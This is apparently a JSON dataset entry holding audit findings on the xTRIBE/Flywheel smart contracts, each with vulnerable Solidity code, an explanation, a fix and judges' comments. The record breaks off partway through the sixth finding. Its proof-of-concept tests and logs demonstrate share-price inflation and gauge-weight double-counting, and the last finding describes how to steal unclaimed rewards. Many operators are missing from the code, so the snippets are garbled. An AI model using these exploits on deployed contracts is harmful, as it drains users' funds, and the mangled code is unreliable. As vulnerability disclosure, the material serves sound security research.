[
    {
        "Code": "",
        "CodeNames": [
            ""
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-01",
                "Location": [
                    "//solidity\nfunction beforeWithdraw(uint256 amount, uint256 shares) internal virtual override {\n    super.beforeWithdraw(amount, shares);\n    storedTotalAssets -= amount;\n}\n",
                    "//solidity\nfunction syncRewards() public virtual {\n    uint192 lastRewardAmount_ = lastRewardAmount;\n    uint32 timestamp = block.timestamp.safeCastTo32();\n\n    if (timestamp < rewardsCycleEnd) revert SyncError();\n\n    uint256 storedTotalAssets_ = storedTotalAssets;\n    uint256 nextRewards = asset.balanceOf(address(this)) storedTotalAssets_ lastRewardAmount_;\n\n    storedTotalAssets = storedTotalAssets_ + lastRewardAmount_; // SSTORE\n    ...\n"
                ],
                "Type": "  xERC4626.sol  Some users may not be able to withdraw until  rewardsCycleEnd  the due to underflow in  beforeWithdraw() ",
                "Description": "\nxERC4626.sol#L65-L68(https://github.com/fei-protocol/ERC4626/blob/2b2baba0fc480326a89251716f52d2cfa8b09230/src/xERC4626.sol#L65-L68)<br\n\nsolidity\nfunction beforeWithdraw(uint256 amount, uint256 shares) internal virtual override {\n    super.beforeWithdraw(amount, shares);\n    storedTotalAssets -= amount;\n}\n\n\nxERC4626.sol#L78-L87(https://github.com/fei-protocol/ERC4626/blob/2b2baba0fc480326a89251716f52d2cfa8b09230/src/xERC4626.sol#L78-L87)<br\n\nsolidity\nfunction syncRewards() public virtual {\n    uint192 lastRewardAmount_ = lastRewardAmount;\n    uint32 timestamp = block.timestamp.safeCastTo32();\n\n    if (timestamp < rewardsCycleEnd) revert SyncError();\n\n    uint256 storedTotalAssets_ = storedTotalAssets;\n    uint256 nextRewards = asset.balanceOf(address(this)) storedTotalAssets_ lastRewardAmount_;\n\n    storedTotalAssets = storedTotalAssets_ + lastRewardAmount_; // SSTORE\n    ...\n\n\nstoredTotalAssets is a cached value of total assets which will only include the unlockedRewards when the whole cycle ends.\n\nThis makes it possible for storedTotalAssets -= amount to revert when the withdrawal amount exceeds storedTotalAssets, as the withdrawal amount may include part of the unlockedRewards in the current cycle.\n\n\nGiven:\n\n*   rewardsCycleLength = 100 days\n\n1.  Alice deposit() 100 TRIBE tokens;\n2.  The owner transferred 100 TRIBE tokens as rewards and called syncRewards();\n3.  1 day later, Alice redeem() with all shares, the transaction will revert at xERC4626.beforeWithdraw().\n\nAlice's shares worth 101 TRIBE at this moment, but storedTotalAssets = 100, making storedTotalAssets -= amount reverts due to underflow.\n\n4.  Bob deposit() 1 TRIBE tokens;\n5.  Alice withdraw() 101 TRIBE tokens, storedTotalAssets becomes 0;\n6.  Bob can't even withdraw 1 wei of TRIBE token, as storedTotalAssets is now 0.\n\nIf there are no new deposits, both Alice and Bob won't be able to withdraw any of their funds until rewardsCycleEnd.\n\n",
                "Repair": "\nConsider changing to:\n\nsolidity\nfunction beforeWithdraw(uint256 amount, uint256 shares) internal virtual override {\n    super.beforeWithdraw(amount, shares);\n    uint256 _storedTotalAssets = storedTotalAssets;\n    if (amount = _storedTotalAssets) {\n        uint256 _totalAssets = totalAssets();\n        // _totalAssets _storedTotalAssets == unlockedRewards\n        lastRewardAmount -= _totalAssets _storedTotalAssets;\n        lastSync = block.timestamp;\n        storedTotalAssets = _totalAssets amount;\n    } else {\n        storedTotalAssets = _storedTotalAssets amount;\n    }\n}\n\n\nJoeysantoro (xTRIBE) confirmed, but disagreed with High severity, and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/48#issuecomment-1125544449):\n  This is a valid issue, although the risk is probably medium as the affected user could simply wait until the end of the cycle, and this would only occur in an extreme complete withdrawal of the contract.\n \n As a soft mitigation, I would prefer to simply override maxWithdraw to return storedTotalAssets_.\n\n0xean (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/48#issuecomment-1132031068):\n  I agree with the sponsor here. Assets are not directly lost. \n \n \n 3 \u2014 High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n \n \n \n 2 \u2014 Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n \n So a medium severity seems more appropriate. \n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-02",
                "Location": [
                    "js\n\n    function testExploitNormalCase() public {\n        token.mint(address(this), 1e24); // funding\n        token.approve(address(xToken), type(uint256).max);\n        xToken.syncRewards();\n        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 1e18  \", xToken.deposit(1e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        hevm.warp(3601); // new cycle\n        emit log_named_uint(\"deposit 2e18  \", xToken.deposit(2e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // Share price stay the same 1:1. Due to no rewards have been given.\n    }\n\n    function testExploitShare() public {\n        token.mint(address(this), 1e24); // funding\n        token.approve(address(xToken), type(uint256).max);\n\n        // init total supply as 1:1 share with token as one.\n        xToken.deposit(1, address(this));\n\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_string(\"transfer 100e18 fake token rewards to inflate share price\");\n        // transfer fake rewards token to xToken contract to inflate totalAsset()\n        token.transfer(address(xToken), 100e18);\n        xToken.syncRewards();\n        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value\n\n        // totalSupply() still 1. So current share price is ~ 1e18 token instead of 1:1 for token.\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 1e18  \", xToken.deposit(1e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // After new cycle come around. No rewards have been given.\n        // But TotalAsset() have been updated to include fake rewards transfer above.\n        // this push share price even higher than it should be.\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        hevm.warp(3601); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 2e18  \", xToken.deposit(2e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // xToken.syncRewards();\n        // hevm.warp(7202); // new cycle\n        // Test rounding up value of share\n        emit log_named_uint(\"deposit 1.3e17\", xToken.deposit(1.3e17, address(this)));\n        emit log_named_uint(\"deposit 1.9e17\", xToken.deposit(1.9e17, address(this)));\n        emit log_named_uint(\"deposit 2e17  \", xToken.deposit(2e17, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 2.5e17\", xToken.deposit(2.5e17, address(this)));\n        // token too small will be reverted.\n        hevm.expectRevert(abi.encodePacked(\"ZERO_SHARES\"));\n        xToken.deposit(1e17, address(this));\n        emit log_string(\"deposit token less than share price amount will be reverted with zero share error\");\n\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        xToken.syncRewards();\n        hevm.warp(7610); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        xToken.syncRewards();\n        hevm.warp(7610+3601); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n    }\n",
                    "js\nRunning 2 tests for srctestxERC4626.t.sol:xERC4626Test\n[PASS] testExploitNormalCase() (gas: 286966)\nLogs:\n  share price   : 1\n  deposit 1e18  : 1000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n  fast forward 1 hour to new rewards cycle\n  deposit 2e18  : 2000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n\n[PASS] testExploitShare() (gas: 410737)\nLogs:\n  share price   : 1\n  transfer 100e18 fake token rewards to inflate share price\n  share price   : 100000000000000001\n  deposit 1e18  : 9\n  share price   : 110000000000000000\n  deposit 500e18: 4545\n  share price   : 110010976948408342\n  deposit 500e18: 4545\n  share price   : 110010989010989010\n  fast forward 1 hour to new rewards cycle\n  share price   : 120989010989010989\n  deposit 2e18  : 16\n  share price   : 120996050899517332\n  deposit 500e18: 4132\n  share price   : 120999396135265700\n  deposit 1.3e17: 1\n  deposit 1.9e17: 1\n  deposit 2e17  : 1\n  share price   : 121011244434382310\n  deposit 2.5e17: 2\n  deposit token less than share price amount will be reverted due to return 0 share\n  fast forward 1 hour to new rewards cycle\n  share price   : 121011846374405794\n  fast forward 1 hour to new rewards cycle\n  share price   : 121011846374405794\n\nTest result: ok. 2 passed; 0 failed; finished in 20.78ms\n"
                ],
                "Type": " First xERC4626 deposit exploit can break share calculation",
                "Description": "\nSolmate convertToShares function(https://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L133) follow the formula: assetDepositAmount * totalShareSupply / assetBalanceBeforeDeposit.\n\nThe share price always return 1:1 with asset token. If everything work normally, share price will slowly increase with time to 1:2 or 1:10 as more rewards coming in.\n\nBut right after xERC4626 contract creation, during first cycle, any user can deposit 1 share set totalSupply = 1. And transfer token to vault to inflate totalAssets() before rewards kick in. (Basically, pretend rewards themselves before anyone can deposit in to get much better share price.)\n\nThis can inflate base share price as high as 1:1e18 early on, which force all subsequence deposit to use this share price as base.\n\n\nNew xERC4626 vault share price can be manipulated right after creation.\nWhich give early depositor greater share portion of the vault during the first cycle.\n\nWhile deposit token also affected by rounding precision (due to exploit above) that always return lesser amount of share for user.\n\n\nAdd these code to xERC4626Test.t.sol file to test.\n\njs\n\n    function testExploitNormalCase() public {\n        token.mint(address(this), 1e24); // funding\n        token.approve(address(xToken), type(uint256).max);\n        xToken.syncRewards();\n        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 1e18  \", xToken.deposit(1e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        hevm.warp(3601); // new cycle\n        emit log_named_uint(\"deposit 2e18  \", xToken.deposit(2e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // Share price stay the same 1:1. Due to no rewards have been given.\n    }\n\n    function testExploitShare() public {\n        token.mint(address(this), 1e24); // funding\n        token.approve(address(xToken), type(uint256).max);\n\n        // init total supply as 1:1 share with token as one.\n        xToken.deposit(1, address(this));\n\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_string(\"transfer 100e18 fake token rewards to inflate share price\");\n        // transfer fake rewards token to xToken contract to inflate totalAsset()\n        token.transfer(address(xToken), 100e18);\n        xToken.syncRewards();\n        hevm.warp(1); // skip 1 block from sync rewards. to update new TotalAsset() value\n\n        // totalSupply() still 1. So current share price is ~ 1e18 token instead of 1:1 for token.\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 1e18  \", xToken.deposit(1e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // After new cycle come around. No rewards have been given.\n        // But TotalAsset() have been updated to include fake rewards transfer above.\n        // this push share price even higher than it should be.\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        hevm.warp(3601); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 2e18  \", xToken.deposit(2e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 500e18\", xToken.deposit(500e18, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        // xToken.syncRewards();\n        // hevm.warp(7202); // new cycle\n        // Test rounding up value of share\n        emit log_named_uint(\"deposit 1.3e17\", xToken.deposit(1.3e17, address(this)));\n        emit log_named_uint(\"deposit 1.9e17\", xToken.deposit(1.9e17, address(this)));\n        emit log_named_uint(\"deposit 2e17  \", xToken.deposit(2e17, address(this)));\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n        emit log_named_uint(\"deposit 2.5e17\", xToken.deposit(2.5e17, address(this)));\n        // token too small will be reverted.\n        hevm.expectRevert(abi.encodePacked(\"ZERO_SHARES\"));\n        xToken.deposit(1e17, address(this));\n        emit log_string(\"deposit token less than share price amount will be reverted with zero share error\");\n\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        xToken.syncRewards();\n        hevm.warp(7610); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n\n        emit log_string(\"fast forward 1 hour to new rewards cycle\");\n        xToken.syncRewards();\n        hevm.warp(7610+3601); // new cycle\n        emit log_named_uint(\"share price   \", xToken.convertToAssets(1));\n    }\n\n\nLog Result:\n\njs\nRunning 2 tests for srctestxERC4626.t.sol:xERC4626Test\nPASS] testExploitNormalCase() (gas: 286966)\nLogs:\n  share price   : 1\n  deposit 1e18  : 1000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n  fast forward 1 hour to new rewards cycle\n  deposit 2e18  : 2000000000000000000\n  share price   : 1\n  deposit 500e18: 500000000000000000000\n  share price   : 1\n\nPASS] testExploitShare() (gas: 410737)\nLogs:\n  share price   : 1\n  transfer 100e18 fake token rewards to inflate share price\n  share price   : 100000000000000001\n  deposit 1e18  : 9\n  share price   : 110000000000000000\n  deposit 500e18: 4545\n  share price   : 110010976948408342\n  deposit 500e18: 4545\n  share price   : 110010989010989010\n  fast forward 1 hour to new rewards cycle\n  share price   : 120989010989010989\n  deposit 2e18  : 16\n  share price   : 120996050899517332\n  deposit 500e18: 4132\n  share price   : 120999396135265700\n  deposit 1.3e17: 1\n  deposit 1.9e17: 1\n  deposit 2e17  : 1\n  share price   : 121011244434382310\n  deposit 2.5e17: 2\n  deposit token less than share price amount will be reverted due to return 0 share\n  fast forward 1 hour to new rewards cycle\n  share price   : 121011846374405794\n  fast forward 1 hour to new rewards cycle\n  share price   : 121011846374405794\n\nTest result: ok. 2 passed; 0 failed; finished in 20.78ms\n\n\n",
                "Repair": "\nThis exploit is unique to contract similar to ERC4626. It only works if starting supply equal 0 or very small number and rewards cycle is very short. Or everyone withdraws, total share supply become 0.\n\nThis can be easily fix by making sure someone always deposited first so totalSupply become high enough that this exploit become irrelevant. Unless in unlikely case someone made arbitrage bot watching vault factory contract.<br\nJust force deposit early token during vault construction as last resort.\n\nJoeysantoro (xTRIBE) commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/66#issuecomment-1126303570):\n  https://github.com/Rari-Capital/solmate/pull/174/files this is a known issue with 4626. xTRIBE would be initialized safely in this case.\n\n0xean (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/66#issuecomment-1132027880):\n  Known or unknown this is still a valid attack that isn't mitigated for in the current codebase.  Given that there are mitigations that could be integrated on chain (like in the uniswap contracts that burn the first dust amount of LP tokens) , and the warden did demonstrate the attack I am going to downgrade this to medium severity as a \"leak of value\".\n \n \n 2 \u2014 Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-03",
                "Location": [],
                "Type": "  ERC20Gauges : The  _incrementGaugeWeight  function does not check the gauge parameter enough, so the user may lose rewards",
                "Description": "\nThe _incrementGaugeWeight function is used to increase the user's weight on the gauge. However, in the _incrementGaugeWeight function, it is only checked that the gauge parameter is not in _deprecatedGauges, but not checked that the gauge parameter is in _gauges. If the user accidentally uses the wrong gauge parameter, the function will be executed smoothly without any warning, which will cause user loss reward.\n\n        function _incrementGaugeWeight(\n            address user,\n            address gauge,\n            uint112 weight,\n            uint32 cycle\n        ) internal {\n            if (_deprecatedGauges.contains(gauge)) revert InvalidGaugeError();\n            unchecked {\n                if (cycle block.timestamp <= incrementFreezeWindow) revert IncrementFreezeError();\n            }\n\n            bool added = _userGauges[user].add(gauge); // idempotent add\n            if (added && _userGauges[user].length()  maxGauges && !canContractExceedMaxGauges[user])\n                revert MaxGaugeError();\n\n            getUserGaugeWeight[user][gauge] += weight;\n\n            _writeGaugeWeight(_getGaugeWeight[gauge], _add, weight, cycle);\n\n            emit IncrementGaugeWeight(user, gauge, weight, cycle);\n        }\n        ...\n        function _writeGaugeWeight(\n            Weight storage weight,\n            function(uint112, uint112) view returns (uint112) op,\n            uint112 delta,\n            uint32 cycle\n        ) private {\n            uint112 currentWeight = weight.currentWeight; // @audit  currentWeight = 0\n            // If the last cycle of the weight is before the current cycle, use the current weight as the stored.\n            uint112 stored = weight.currentCycle < cycle ? currentWeight : weight.storedWeight; // @audit  stored = 0 < cycle ? 0 : 0\n            uint112 newWeight = op(currentWeight, delta); // @audit newWeight = 0 + delta\n\n            weight.storedWeight = stored;\n            weight.currentWeight = newWeight;\n            weight.currentCycle = cycle;\n        }\n\n\nERC20Gauges.sol#L257(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L257)<br\n\n",
                "Repair": "\n        function _incrementGaugeWeight(\n            address user,\n            address gauge,\n            uint112 weight,\n            uint32 cycle\n        ) internal {\n          if (_deprecatedGauges.contains(gauge)) revert InvalidGaugeError();\n    +       if (_deprecatedGauges.contains(gauge) || !_gauges.contains(gauge)) revert InvalidGaugeError();\n            unchecked {\n                if (cycle block.timestamp <= incrementFreezeWindow) revert IncrementFreezeError();\n            }\n\n            bool added = _userGauges[user].add(gauge); // idempotent add\n            if (added && _userGauges[user].length()  maxGauges && !canContractExceedMaxGauges[user])\n                revert MaxGaugeError();\n\n            getUserGaugeWeight[user][gauge] += weight;\n\n            _writeGaugeWeight(_getGaugeWeight[gauge], _add, weight, cycle);\n\n     }\n\nJoeysantoro (xTRIBE) disagreed with High severity and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/5#issuecomment-1109219762):\n  This is absolutely a valid logic bug. I disagree with the severity, as it would be user error to increment a gauge which was incapable of receiving any weight. Should be medium.\n\n0xean (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/5#issuecomment-1130311075):\n  This is a tough one to call between medium and high severity. Assets can directly be lost, but putting the wrong address into ANY function call in general is an easy way for a user to lose funds and isn't unique to this protocol.  I am going to side with the sponsor and downgrade to medium severity. \n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-04",
                "Location": [],
                "Type": " In  ERC20Gauges , contribution to total weight is double-counted when  incrementGauge  is called before  addGauge  for a given gauge.",
                "Description": "\nERC20Gauges.sol#L214(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L214)<br\nERC20Gauges.sol#L257(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L257)<br\nERC20Gauges.sol#L248(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L248)<br\nERC20Gauges.sol#L465-L469(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L465-L469)<br\n\nThe impact depends really on how gauges are used by other contracts.\n\nThe most obvious consequence I can imagine is that some other contract distributes rewards based on calculateGaugeAllocation. However, because _getStoredWeight(_totalWeight, currentCycle)  is now larger than the real total sum of weights, all rewards are smaller than they should be (because of larger denominator total).\n\nThere can be also (potentially large) leftover amount of rewards that is never distributed because now sum of  calculateGaugeAllocation(gauge, quantity) over all gauges with constant quantity is less than quantity. So value might be lost.\n\n\nI added this test (modified testCalculateGaugeAllocation ) to ERC20GaugesTest.t.sol and it passes.\n\n        function testExploit() public {\n            token.mint(address(this), 100e18);\n\n            token.setMaxGauges(2);\n            token.addGauge(gauge1);\n\n            require(token.incrementGauge(gauge1, 1e18) == 1e18);\n            require(token.incrementGauge(gauge2, 1e18) == 2e18);\n            \n            // gauge added after incrementing...\n            token.addGauge(gauge2);\n\n            hevm.warp(3600); // warp 1 hour to store changes\n            require(token.calculateGaugeAllocation(gauge1, 150e18) == 50e18);\n            require(token.calculateGaugeAllocation(gauge2, 150e18) == 50e18);\n\n            // expected value would be 2e18\n            require(token.totalWeight() == 3e18);\n\n            require(token.incrementGauge(gauge2, 2e18) == 4e18);\n\n            // ensure updates don't propagate until stored\n            require(token.calculateGaugeAllocation(gauge1, 150e18) == 50e18);\n            require(token.calculateGaugeAllocation(gauge2, 150e18) == 50e18);\n\n            hevm.warp(7200); // warp another hour to store changes again\n            require(token.calculateGaugeAllocation(gauge1, 125e18) == 25e18);\n            require(token.calculateGaugeAllocation(gauge2, 125e18) == 75e18);\n            \n            // expected value would be 4e18\n            require(token.totalWeight() == 5e18);\n        }\n\nAs we  can see, we can call token.incrementGauge(gauge2, 1e18) before token.addGauge(gauge2). This is because this check(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L257) doesn't revert for gauges that were never added in the first place.\n\nFirst time the total weight is incremented in _incrementUserAndGlobalWeights and 2nd time here(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L465-L469).\n\nIf corrupting state like this is adventurous for someone, he can frontrun token.addGauge called by the admin with a call to incrementGauge which is permissionless.\n\n\nFoundry\n\n",
                "Repair": "\nUse condition _gauges.contains(gauge) && !_deprecatedGauges.contains(gauge)  to check if a gauge can be incremented instead of just  !_deprecatedGauges.contains(gauge)  . There's a function isGauge  in the contract that does exactly this.\n\nJoeysantoro (xTRIBE) commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/22#issuecomment-1110487797):\n  Duplicate of M-03(https://github.com/code-423n4/2022-04-xtribe-findings/issues/5).\n\n0xean (judge) commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/22#issuecomment-1132291576):\n  I think this is different enough from M-03 to warrant its own issue and stand alone. Happy to discuss further with sponsor if they are adamant it's a duplicate. \n\nthomas-waite (xTRIBE) confirmed and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/22#issuecomment-1184672109):\n  This is caused by and is a unique symptom of the same underlying issue as M-03.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-05",
                "Location": [],
                "Type": "  FlywheelCore 's  setFlywheelRewards  can remove access to reward funds from current users",
                "Description": "\nFlywheelCore.setFlywheelRewards can remove current reward funds from the current users' reach as it doesn't check that newFlywheelRewards' FlywheelCore is this contract.\n\nIf it's not, by mistake or with a malicious intent, the users will lose the access to reward funds as this FlywheelCore will not be approved for any fund access to the new flywheelRewards, while all the reward funds be moved there.\n\nSetting severity to medium as on one hand that's system breaking issue (no rewards can be claimed after that, users are rugged reward-wise), on the other hand setFlywheelRewards function is requiresAuth. Also, a room for operational mistake isn't too small here as new flywheelRewards contract can be correctly configured and not malicious in all other regards.\n\n\nFlywheelCore.setFlywheelRewards doesn't check that newFlywheelRewards' FlywheelCore is this FlywheelCore instance:\n\nFlywheelCore.sol#L164-L171(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L164-L171)<br\n\nFlywheelCore is immutable within flywheelRewards and its access to the flywheelRewards' funds is set on construction:\n\nBaseFlywheelRewards.sol#L30(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/BaseFlywheelRewards.sol#L30)<br\n\nThis way if new flywheelRewards contract have any different FlywheelCore then current users' access to reward funds will be irrevocably lost as both claiming functionality and next run of setFlywheelRewards will revert, not being able to transfer any funds from flywheelRewards with rewardToken.safeTransferFrom(address(flywheelRewards), ...):\n\nFlywheelCore.sol#L125(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L125)<br\n\nFlywheelCore.sol#L168(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L168)<br\n\nAs FlywheelCore holds user funds accounting via rewardsAccrued mapping, all these accounts became non-operational, as all the unclaimed rewards will be lost for the users.\n\n",
                "Repair": "\nConsider adding the require for address(newFlywheelRewards.flywheel) == address(flywheelRewards.flywheel) in setFlywheelRewards so that users always retain funds access.\n\nJoeysantoro (xTRIBE) acknowledged and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/40#issuecomment-1110497641):\n  Similar to M-06(https://github.com/code-423n4/2022-04-xtribe-findings/issues/23). I think adding this check makes sense.\n\n0xean (judge) commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/40#issuecomment-1130776435):\n  This issue seems distinct enough from M-06 to warrant separate issues. Leaving open and not as a duplicate. \n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-06",
                "Location": [
                    "//solidity\nFile: flywheel-v2/src/FlywheelCore.sol\n\n182       /// @notice swap out the flywheel booster contract\n183       function setBooster(IFlywheelBooster newBooster) external requiresAuth {\n184           flywheelBooster = newBooster;\n185   \n186           emit FlywheelBoosterUpdate(address(newBooster));\n187       }\n",
                    "//solidity\nFile: flywheel-v2/src/FlywheelCore.sol\n\n258           uint256 supplierTokens = address(flywheelBooster) != address(0)\n259               ? flywheelBooster.boostedBalanceOf(strategy, user)\n260               : strategy.balanceOf(user);\n261   \n262           // accumulate rewards by multiplying user tokens by rewardsPerToken index and adding on unclaimed\n263           uint256 supplierDelta = (supplierTokens * deltaIndex) / ONE;\n264           uint256 supplierAccrued = rewardsAccrued[user] + supplierDelta;\n265   \n266           rewardsAccrued[user] = supplierAccrued;\n",
                    "//solidity\nFile: flywheel-v2/src/FlywheelCore.sol\n\n119       function claimRewards(address user) external {\n120           uint256 accrued = rewardsAccrued[user];\n121   \n122           if (accrued != 0) {\n123               rewardsAccrued[user] = 0;\n124   \n125               rewardToken.safeTransferFrom(address(flywheelRewards), user, accrued);\n",
                    "//solidity\nFile: flywheel-v2/src/rewards/BaseFlywheelRewards.sol\n\n25        constructor(FlywheelCore _flywheel) {\n26            flywheel = _flywheel;\n27            ERC20 _rewardToken = _flywheel.rewardToken();\n28            rewardToken = _rewardToken;\n29    \n30            _rewardToken.safeApprove(address(_flywheel), type(uint256).max);\n31        }\n"
                ],
                "Type": "  FlywheelCore.setBooster()  can be used to steal unclaimed rewards",
                "Description": "\nA malicious authorized user can steal all unclaimed rewards and break the reward accounting\n\nEven if the authorized user is benevolent the fact that there is a rug vector available may negatively impact the protocol's reputation(https://twitter.com/RugDocIO/status/1411732108029181960). Furthermore since this contract is meant to be used by other projects, the trustworthiness of every project cannot be vouched for.\n\n\nBy setting a booster that returns zero for all calls to boostedBalanceOf() where the user address is not under the attacker's control, and returning arbitrary values for those under his/her control, an attacker can choose specific amounts of rewardToken to assign to himself/herself. The attacker can then call claimRewards() to withdraw the funds. Any amounts that the attacker assigns to himself/herself over the amount that normally would have been assigned, upon claiming, is taken from other users' unclaimed balances, since tokens are custodied by the flywheelRewards address rather than per-user accounts.\n\nsolidity\nFile: flywheel-v2/src/FlywheelCore.sol\n\n182       /// @notice swap out the flywheel booster contract\n183       function setBooster(IFlywheelBooster newBooster) external requiresAuth {\n184           flywheelBooster = newBooster;\n185   \n186           emit FlywheelBoosterUpdate(address(newBooster));\n187       }\n\n\nFlywheelCore.sol#L182-L187(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L182-L187)<br\n\nsolidity\nFile: flywheel-v2/src/FlywheelCore.sol\n\n258           uint256 supplierTokens = address(flywheelBooster) != address(0)\n259               ? flywheelBooster.boostedBalanceOf(strategy, user)\n260               : strategy.balanceOf(user);\n261   \n262           // accumulate rewards by multiplying user tokens by rewardsPerToken index and adding on 